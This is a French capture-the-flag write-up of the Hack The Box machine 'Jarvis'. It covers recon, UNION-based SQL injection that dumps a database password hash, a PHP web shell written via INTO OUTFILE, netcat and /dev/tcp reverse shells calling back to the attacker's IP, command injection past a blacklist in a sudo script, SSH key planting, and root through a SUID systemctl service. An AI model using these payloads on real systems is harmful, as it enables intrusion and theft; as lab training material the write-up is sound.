# 10.10.10.143 

# Reco

`ping 10.10.10.143`

```
PING 10.10.10.143 (10.10.10.143) 56(84) bytes of data.
64 bytes from 10.10.10.143: icmp_seq=1 ttl=63 time=17.9 ms
64 bytes from 10.10.10.143: icmp_seq=2 ttl=63 time=17.6 ms
```


`sudo nmap -sS -p- -vvv -oA  10.10.10.143_sS 10.10.10.143`

```
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    open     http    syn-ack ttl 63
5355/tcp  filtered llmnr   no-response
64999/tcp open     unknown syn-ack ttl 63
```


`sudo nmap -sV -p22,80,5355,64999 -vvv -oA  10.10.10.143_sV 10.10.10.143`

```
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open     http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
5355/tcp  filtered llmnr   no-response
64999/tcp open     http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


`sudo nmap -sC -p80,22,5355,64999 -vvv -oA  10.10.10.143_sC 10.10.10.143`

```
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzv4ZGiO8sDRbIsdZhchg+dZEot3z8++mrp9m0VjP6qxr70SwkE0VGu+GkH7vGapJQLMvjTLjyHojU/AcEm9MWTRWdpIrsUirgawwROic6HmdK2e0bVUZa8fNJIoyY1vPa4uNJRKZ+FNoT8qdl9kvG1NGdBl1+zoFbR9az0sgcNZJ1lZzZNnr7zv/Jghd/ZWjeiiVykomVRfSUCZe5qZ/aV6uVmBQ/mdqpXyxPIl1pG642C5j5K84su8CyoiSf0WJ2Vj8GLiKU3EXQzluQ8QJJPJTjj028yuLjDLrtugoFn43O6+IolMZZvGU9Man5Iy5OEWBay9Tn0UDSdjbSPi1X
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDW2OapO3Dq1CHlnKtWhDucQdl2yQNJA79qP0TDmZBR967hxE9ESMegRuGfQYq0brLSR8Xi6f3O8XL+3bbWbGQ=
|   256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuKufVSUgOG304mZjkK8IrZcAGMm76Rfmq2by7C0Nmo
80/tcp    open     http    syn-ack ttl 63
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Stark Hotel
5355/tcp  filtered llmnr   no-response
64999/tcp open     unknown syn-ack ttl 63
```

# Ports
## HTTPS (443/TCP)
### Reco

`nikto -h "http://10.10.10.143"`   

```
+ Server: Apache/2.4.25 (Debian)
[...]
+ /phpmyadmin/: phpMyAdmin directory found
```

- On identifie une page `phpmyadmin` qui peut aussi être identifée par `gobuster`

`gobuster -u "http://10.10.10.143" -w "/usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/common.txt`   

```
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/phpmyadmin (Status: 301)
```

- On lance `gobuster` sur les sous dossiers de `phpmyadmin` 

`gobuster -u "http://10.10.10.143/phpmyadmin/" -w `
```
"/usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/big.txt"
/ChangeLog (Status: 200)
/LICENSE (Status: 200)
/README (Status: 200)
/doc (Status: 301)
/examples (Status: 301)
/favicon.ico (Status: 200)
/js (Status: 301)
/libraries (Status: 301)
/locale (Status: 301)
/robots.txt (Status: 200)
/setup (Status: 301)
/sql (Status: 301)
/templates (Status: 301)
/themes (Status: 301)
/tmp (Status: 301)
/vendor (Status: 301)
```

- On se rendus sur la page `/ChangeLog`

```
phpMyAdmin - ChangeLog
======================
4.8.0 (2018-04-07)
```

- Recherche de CVE sur searchsploit & CVEdetails

`searchsploit "phpmyadmin 4.8.0"`
```
CSRF authenticated
```

- https://www.cvedetails.com/cve/CVE-2018-12613/
- https://www.rapid7.com/db/modules/exploit/multi/http/phpmyadmin_lfi_rce
- https://www.exploit-db.com/exploits/44928
- https://www.exploit-db.com/exploits/44924

### SQLi manuelle

- On voit que ça ne renvoie rien, mais pas d'erreur SQL apparente

`http://10.10.10.143/room.php?cod=%27`

`http://10.10.10.143/room.php?cod=1%20or%201=1`

- Operation arithmetique, renvoie la même chose que `code=2`

`http://10.10.10.143/room.php?cod=4-2 `

- On cherche à identifier le nombre de colonnes : 

`http://10.10.10.143/room.php?cod=1%20order%20by%207`

- Si > 7 : erreur

`http://10.10.10.143/room.php?cod=1%20union%20select%201,2,3,4,5,6,7`
	
- Si > 7 : erreur

- On cherche à savoir quelles sont les colonnes affichées sur la page web : 

`http://10.10.10.143/room.php?cod=-1%20union%20select%201,2,3,4,5,6,7`

- On voit apparaitre `5`, `2`, `3`, `4` dans la page web

- On remplace `2`, `3`, `4` par des fonctions permettants d'obtenir des informations sur la BDD : 

`http://10.10.10.143/room.php?cod=-1%20union%20select%201,version(),database(),user(),5,6,7`

```	
version: 10.1.37-MariaDB-0+deb9u1
database: hotel
user: DBadmin@localhost
```

- On récupére les noms des bases de données

`GET /room.php?cod=-1%20union%20select%201,group_concat(schema_name),3,4,5,6,7%20from%20(select%20schema_name%20from%20information_schema.schemata%20limit%200,100)a`

```
ceeir,hotel,information_schema,mysql,pakal,performance_schema,ttpaz,tzcgw,vkpux,xahox,zhqb
```

- On récupére les tables de la BDD selectionnée `hotel`

`GET /room.php?cod=-1%20union%20select%201,table_name,3,4,5,6,7%20from%20information_schema.tables HTTP/1.1`

```
wbziu
```

- Ne récupére qu'une seule table (DEATH ROW), on change l'injection pour obtenir plus de lignes :

`GET /room.php?cod=-1%20union%20select%201,group_concat(table_name),3,4,5,6,7%20from%20(select%20table_name%20from%20information_schema.tables%20limit%200,100)a`

```
wbziu,room,ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_CACHES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,GEOMETRY_COLUMNS,SPATIAL_REF_SYS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,TABLE_STATISTICS,INNODB_SYS_TABLESTATS,USER_STATISTICS,INNODB_SYS_INDEXES,XTRADB_RSEG,INNODB_CMP_PER_INDEX,INNODB_TRX,CHANGED_PAGE_BITMAPS,INNODB_FT_BEING_DELETED,INNODB_LOCK_WAITS,INNODB_LOCKS,INNODB_TABLESPACES_ENCRYPTION,XTRADB_INTERNAL_HASH_TABLES,INNODB_SYS_FIELDS,INNODB_CMPMEM_RESET,INNODB_CMP,INNODB_FT_INDEX_TABLE,INNODB_SYS_TABLESPACES,INNODB_MUTEXES,INNODB_BUFFER_PAGE_LRU,INNODB_SYS_FOREIGN_COLS,INNODB_CMP_RESET,INNODB_BUFFER_POOL_STATS,INN	
```

- *Note* : Les tables aux noms aleatoire sont des tables crées par des attaquants

- Récupération des noms de colonnes de la table `room` de la BDD selectionée `hotel`

`GET /room.php?cod=-1+union+select+1,cast(group_concat(column_name)+as+char(2048)),3,4,5,6,7+from+(select+column_name+from+information_schema.columns+where+table_name=%27room%27+limit+0,2000)a`

```
cod,name,price,descrip,star,image,mini
```

- **/!\ Bien mettre le nom de la table entre simple quote ' '**

- Récupération des données de la table `room` de la BDD selectionée `hotel`

`GET /room.php?cod=-1+union+select+1,cast(group_concat(cod,0x3a,name)+as+char(2048)),3,4,5,6,7+from+room+limit+0,1000--`
`GET /room.php?cod=-1+union+select+1,cast(group_concat(cod,0x3a,name)+as+char(2048)),3,4,5,6,7+from+room`

```
1:Superior Family Room,2:Suite,3:Double Room,4:Family Room,5:Classic Double Room,6:Superior Family Room
```

- Récupérer les noms de colonnes de la table `user` de la BDD `mysql`

`GET /room.php?cod=-1+union+select+1,cast(group_concat(column_name)+as+char(2048)),3,4,5,6,7+from+(select+column_name+from+information_schema.columns+where+table_schema=%27mysql%27+and+table_name=%27user%27+limit+0,2000)a`

- Récupérer les données de la table `user`  de la BDD `mysql`

`GET /room.php?cod=-1+union+select+1,cast(group_concat(User,0x3a,Password)+as+char(2048)),3,4,5,6,7+from+(select+User,Password+from+mysql.user+limit+0,2000)a`

**DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0**

- On casse le hash avec JTR

`john hashes`

```
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Wordlist
Almost done: Processing the remaining buffered candidate passwords, if any
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
imissyou         (DBadmin)
```

- Mise en place d'un **web shell** via la SQLi

`GET /room.php?cod=-1+union+select+1,+'<%3fphp+system($_GET["cmd"]);+%3f>',3,4,5,6,7+into+outfile+'/var/www/html/cmdxxxx.php'`
	
`curl -i -s -k  -X $'GET' -H $'Host: 10.10.10.143' -H $'User-Agent: Mozilla/5.0' $'http://10.10.10.143/cmdxxxx.php?cmd=whoami'` 

``` 
	HTTP/1.1 200 OK
	Date: Wed, 28 Aug 2019 21:30:31 GMT
	Server: Apache/2.4.25 (Debian)
	IronWAF: 2.0.3
	Content-Length: 22
	Content-Type: text/html; charset=UTF-8
	1	www-data
	3	4	5	6	7
```

- Requête vers le webshell

`GET /cmdxxxx.php?cmd=cat%20/etc/passwd HTTP/1.1`

```bash
root:x:0:0:root:/root:/bin/bash
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash		
```

- Mise en place d'un **reverse shell** depuis le **web shell**

`GET /cmdxxxx.php?cmd=echo+'nc+-e+/bin/sh+10.10.13.5+8888'+>+co.sh HTTP/1.1`

- On vérifie le contenus du fichier : `GET /cmdxxxx.php?cmd=cat+co.sh HTTP/1.1`

```
nc -e /bin/sh 10.10.13.5 8888
```

- On ajoute les droits d'exécution pour l'utilisateur courant : `GET /cmdxxxx.php?cmd=chmod+%2bx+co.sh HTTP/1.1`

- On vérifie la bonne mise en place des droits : `GET /cmdxxxx.php?cmd=ls+-l+co.sh HTTP/1.1`

```
-rwxr-xr-x 1 www-data www-data 30 Aug 28 17:43 co.sh
```

- Execution du RS : `GET /cmdxxxx.php?cmd=./co.sh HTTP/1.1`

```bash
nc -nlvp 8888     
listening on [any] 8888 ...
connect to [10.10.13.5] from (UNKNOWN) [10.10.10.143] 40820
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@jarvis:/var/www/html$
```

- Résumé des commandes manuelles 

```
172.16.204.133/room.php?cod=1 order by 7
172.16.204.133/room.php?cod=-1 union select 1,2,3,4,5,6,7
172.16.204.133/room.php?cod=-1 union select 1, group_concat(schema_name), 3, 4,5, 6, 7 from information_schema.schemata
172.16.204.133/room.php?cod=-1 union select 1, group_concat(table_name), 3, 4,5, 6, 7 from information_schema.tables where table_schema='hotel'
172.16.204.133/room.php?cod=-1 union select 1, group_concat(column_name), 3, 4,5, 6, 7 from information_schema.columns where table_name='room'
172.16.204.133/room.php?cod=-1 union select 1, group_concat(table_name), 3, 4,5, 6, 7 from information_schema.tables where table_schema='mysql'
172.16.204.133/room.php?cod=-1 union select 1, group_concat(column_name), 3, 4,5, 6, 7 from information_schema.columns where table_name='user'
172.16.204.133/room.php?cod=-1 union select 1, group_concat(User,0x0a,Password),3, 4, 5, 6, 7 from mysql.user
```

### SQLi avec sqlmap

`sqlmap -u "http://10.10.10.143/room.php?cod=1" -p cod  --level 4 --risk 3 --dbms=MySQL --os-shell`

```
[1] common location(s) ('/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www')
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:    'www-data'
[18:33:17] [INFO] cracked password 'imissyou' for hash '*2d2b7a5e4e637b8fba1d17f40318f277d29964d0'
```

`sqlmap -u 'http://10.10.10.143/room.php?cod=5' --users --passwords`

Credential pour phpmyadmin : **DBadmin:imissyou**

## Privilege Escalation
### Pepper
#### Exécution de commande
`www-data@jarvis:/home/pepper$ sudo -l`

```
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

- (user:group) tag:commands
	- user specifies which users you can use with the -u options to run the command
	- group specifies which groups you can use with the -g options

- Cette configuration nous permet d'executer le script /var/www/Admin-Utilities/simpler.py en tant que pepper

`www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p`

`www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -l`

- On identifie on lisant le code que la fonction de ping (-p) contient ce code, avec une whitlist de caractere qui ne peuvent pas être utilise.

```python
def exec_ping():
     forbidden = ['&', ';', '-', '`', '||', '|']
     command = input('Enter an IP: ')
     for i in forbidden:
         if i in command:
             print('Got you')
             exit()
     os.system('ping ' + command)
```

- On essaie d'injecter `OR $(whoami)`

```bash
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: OR $(whoami)
OR $(whoami)
ping: pepper: Temporary failure in name resolution
www-data@jarvis:/var/www/html$ 
```

- Et on obtiens bien une exécution de commande
- On peut directement faire `$(/bin/bash)`
- Pour récupérer le user.txt `OR $(cat /home/pepper/user.txt)`

#### Reverse shell
    - Impossible via le script python de faire un "nc -e" ou un "bash -i" etc du fait de la whitelist qui bloque le "-"
    - Il faut donc créer un fichier .sh contenant un reverse shell pour récupérer un shell en tant que pepper

```bash
echo 'nc -e /bin/sh 10.10.13.5 9999' > co1.sh
cat co1.sh
chmod +x co1.sh
ls -l co1.sh
```

```bash
Enter an IP: OR $(./co1.sh)
OR $(./co1.sh)
```

```bash
nc -nlvp 9999 
listening on [any] 9999 ...
connect to [10.10.13.5] from (UNKNOWN) [10.10.10.143] 46952
whoami
pepper
python -c 'import pty;pty.spawn("/bin/bash")'
pepper@jarvis:/var/www/html$
```

### Root

- Find SUID (toutes les commandes font la même chose)
	- `find / -uid 0 -perm -4000 -type f 2>/dev/null`
	- `find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
	- `find / -user root -perm -4000 -print 2>/dev/null`

- Le binaire systemctl a le bit SUID

`pepper@jarvis:/bin$ ls -la systemctl`
```
-rwsr-x--- 1 root pepper 174520 Feb 17  2019 systemctl
```

- GTFObin nous indique que le SUID sur ce binaire peut mener à une priv esc en root
- Cree un fichier temporaire dans /tmp `TF=$(mktemp).service`
- Ecrit dans le fichier temporaire cree precedement

```bash
echo '[Service]' > $TF
echo 'Type=oneshot' >> $TF
echo 'ExecStart=/bin/sh -c "id > /tmp/output"' >> $TF
echo '[Install]' >> $TF
echo 'WantedBy=multi-user.target' >> $TF
```

- **/!\ Pour éxploiter systemctl il est nécessaire d'avoir un shell stable (via une session SSH par exemple). La méthode ne fonctionne pas à travers un reeverse shell**

#### Session SSH

- On génére un couple de clé rsa en local:

```bash
ssh-keygen -t rsa -b 4096 -o -a 100
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
The key fingerprint is:
SHA256:oLPkOoF4eyGrU50W5jzuU+bMbS5VKuGzyHkDYKo6seI xxxxx@xxx
[...]
passphrase : XXXXX
```

- Ensuite on ajoute notre cle **publique** au fichier `authorized_keys` de la **machine cible** :

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDDl+AChB0YsPo0u42yDa27zGVD4QFGdbLRz5s4k0FutoUPO0qQ5KrZ90gzz+RyAGwjqFg8V9lGypoxrWq2tgKm69U+wRpeDeACIh49N5+ilCJGRQ/4376ZWsoIWLdkTCpUGbUwwLoP8OfpwrSAwD09ZZ1QeZdiQuJ5nI5Q9nz8DaIB3Br8X/2HxOtRYRev5MrfQBDvAjhITodf9GeAgRobbiRTby4LSqlk2ReHuG+tuQwJQ0C/lKaOV8CAFKGbpnkRMlqSvDIV9o8vrl74JW2pF4iwnZhRSeTk1+Bv9SUVPxDp6QMfV55u8Daf5WFsvB43gUTC4uOkPEyceYH/qqnSE7BPi5hDW7mVTg2mcL/JuN66a9Rk9earWdN7bO/WfqOp1dbf42SxD+vtVDydcybHwDdn9qyZjJayNdJJ58ZUy0JrvpmauDfHZ/sk3h7VF2fHfA2X+K/zrECFt3VVhlfKV01nfgDTGPvIi0vEy/ey8xUsJKOXlev8LGKaE+OXEncspPbMI9WhsYBrtuB3rLqJY8+zwJtORVf39bI1VqS3Kd6QdwnErxynvOsSXnz9Fd9xUqWvCf4gJLBPBLIEuk2TUNKr5mn5EDZn5XlqRvVcwTzH2HEvkh1+eNcoJR8SqTbn4M2JksX8PDtKUK5d06uiUmBYEeMBZUVAXXXXXXXXXX== xxxxx@xxx" >> authorized_keys
```

- Puis on viens se connecter en tant que `pepper` en donnant notre cle privée

`ssh pepper@10.10.10.143 -i id_rsa`

```bash
Enter passphrase for key 'id_rsa': 
Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64
pepper@jarvis:~$ whoami
pepper
```

#### Exploitation de systemctl via SUID

- On exploit le systemctl avec SUID

```bash
pepper@jarvis:~$ TF=$(mktemp).service
pepper@jarvis:~$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "id > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
pepper@jarvis:~$ systemctl link $TF
Created symlink /etc/systemd/system/tmp.gUKrAUJZLg.service → /tmp/tmp.gUKrAUJZLg.service.
pepper@jarvis:~$ /systemctl enable --now $TF
-bash: /systemctl: No such file or directory
pepper@jarvis:~$ systemctl enable --now $TF
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.gUKrAUJZLg.service → /tmp/tmp.gUKrAUJZLg.service.
pepper@jarvis:~$ cat /tmp/output
uid=0(root) gid=0(root) groups=0(root)
```

##### Reverse shell #1

- Obtenir un reverse shell dans un context root avec systemctl, il faut changer la ligne `ExecStart`

```bash
TF=$(mktemp).service
pepper@jarvis:~$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "nc -e /bin/sh 10.10.13.5 7777"
> [Install]
> WantedBy=multi-user.target' > $TF
pepper@jarvis:~$ systemctl link $TF
Created symlink /etc/systemd/system/tmp.F1mnWJ7iLb.service → /tmp/tmp.F1mnWJ7iLb.service.
pepper@jarvis:~$ systemctl enable --now $TF
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.F1mnWJ7iLb.service → /tmp/tmp.F1mnWJ7iLb.service.
```

- Initialiser un listener en local : 

```bash
nc -nlvp 7777
listening on [any] 7777 ...
connect to [10.10.13.5] from (UNKNOWN) [10.10.10.143] 41992
whoami
root
python -c 'import pty;pty.spawn("/bin/bash")'
root@jarvis:/# cd /root
cd /root
root@jarvis:/root# cat root.txt
cat root.txt
d41d8cd98f00b204e9800998ecf84271
root@jarvis:/root# 
```

##### Reverse shell #2

- Autre possibilité : creer un .sh et l'executer avec systemctl

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.61/7777 0>&1 
```

```
[Unit]
Description=root shell
[Service]
ExecStart=/tmp/shell_htb.sh
[Install]
WantedBy=multi-user.target
```

# Proof

- User : `2afa36cXXXXXXXXXX259c93551f5c44f`
- Root : `d41d8cd98f00b204eXXXXXXXXXX84271`